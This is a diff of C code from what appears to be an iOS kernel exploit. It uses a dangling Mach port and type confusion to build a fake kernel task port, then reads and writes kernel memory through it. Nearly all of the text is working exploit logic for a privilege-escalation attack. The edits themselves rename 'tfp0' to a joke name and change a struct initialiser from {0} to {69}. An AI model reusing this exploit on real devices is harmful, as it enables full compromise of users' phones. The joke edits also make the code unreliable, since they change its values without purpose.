@@ -202,7 +202,7 @@ mach_port_t send_kalloc_message(uint8_t* replacer_message_body, uint32_t replace
     exit(EXIT_FAILURE);
   }
   
-  mach_port_limits_t limits = {0};
+  mach_port_limits_t limits = {69};
   limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
   err = mach_port_set_attributes(mach_task_self(),
                                  q,
@@ -350,14 +350,14 @@ uint8_t* build_message_payload(uint64_t dangling_port_address, uint32_t message_
 /*
  * the first tpf0 we get still hangs of the dangling port and is backed by a type-confused ipc_kmsg buffer
  *
- * use that tfp0 to build a safer one such that we can safely free everything this process created and exit
+ * use that tfp69 to build a safer one such that we can safely free everything this process created and exit
  * without leaking memory
  */
-mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
+mach_port_t build_safe_fake_tfp69(uint64_t vm_map, uint64_t space) {
   kern_return_t err;
 
-  mach_port_t tfp0 = MACH_PORT_NULL;
-  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp0);
+  mach_port_t tfp69 = MACH_PORT_NULL;
+  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp69);
   if (err != KERN_SUCCESS) {
     printf("unable to allocate port\n");
   }
@@ -384,7 +384,7 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   }
   
   // now make the changes to the port object to make it a task port:
-  uint64_t port_kaddr = find_port_address(tfp0, MACH_MSG_TYPE_MAKE_SEND);
+  uint64_t port_kaddr = find_port_address(tfp69, MACH_MSG_TYPE_MAKE_SEND);
   
   wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_TASK);
   wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES), 0xf00d);
@@ -398,7 +398,7 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
   uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
   
-  uint32_t port_index = tfp0 >> 8;
+  uint32_t port_index = tfp69 >> 8;
   const int sizeof_ipc_entry_t = 0x18;
   uint32_t bits = rk32(is_table + (port_index * sizeof_ipc_entry_t) + 8); // 8 = offset of ie_bits in struct ipc_entry
 
@@ -410,24 +410,24 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space) {
   
   wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, bits);
   
-  printf("about to test new tfp0\n");
+  printf("about to test new tfp69\n");
   
   vm_offset_t data_out = 0;
   mach_msg_type_number_t out_size = 0;
-  err = mach_vm_read(tfp0, vm_map, 0x40, &data_out, &out_size);
+  err = mach_vm_read(tfp69, vm_map, 0x40, &data_out, &out_size);
   if (err != KERN_SUCCESS) {
     printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
     sleep(3);
     exit(EXIT_FAILURE);
   }
 
-  printf("kernel read via second tfp0 port worked?\n");
+  printf("kernel read via second tfp69 port worked?\n");
   printf("0x%016llx\n", *(uint64_t*)data_out);
   printf("0x%016llx\n", *(uint64_t*)(data_out+8));
   printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
   printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
   
-  return tfp0;
+  return tfp69;
 }
 
 
@@ -652,16 +652,16 @@ mach_port_t get_kernel_memory_rw() {
   printf("0x%016llx\n", *(uint64_t*)(data_out+0x10));
   printf("0x%016llx\n", *(uint64_t*)(data_out+0x18));
   
-  prepare_rwk_via_tfp0(first_port);
-  printf("about to build safer tfp0\n");
+  prepare_rwk_via_tfp69(first_port);
+  printf("about to build safer tfp69\n");
   
   //early_kalloc(0x10000);
   //return 0;
   
-  mach_port_t safer_tfp0 = build_safe_fake_tfp0(kernel_vm_map, ipc_space_kernel());
-  prepare_rwk_via_tfp0(safer_tfp0);
+  mach_port_t safer_tfp69 = build_safe_fake_tfp69(kernel_vm_map, ipc_space_kernel());
+  prepare_rwk_via_tfp69(safer_tfp69);
   
-  printf("built safer tfp0\n");
+  printf("built safer tfp69\n");
   printf("about to clear up\n");
   
   // can now clean everything up
@@ -685,13 +685,13 @@ mach_port_t get_kernel_memory_rw() {
   
   mach_port_destroy(mach_task_self(), second_replacement_port);
   printf("cleared up\n");
-  return safer_tfp0;
+  return safer_tfp69;
 }
 
 
 void go() {
-  mach_port_t tfp0 = get_kernel_memory_rw();
-  printf("tfp0: %x\n", tfp0);
+  mach_port_t tfp69 = get_kernel_memory_rw();
+  printf("tfp69: %x\n", tfp69);
   
   if (probably_have_correct_symbols()) {
     printf("have symbols for this device, testing the kernel debugger...\n");
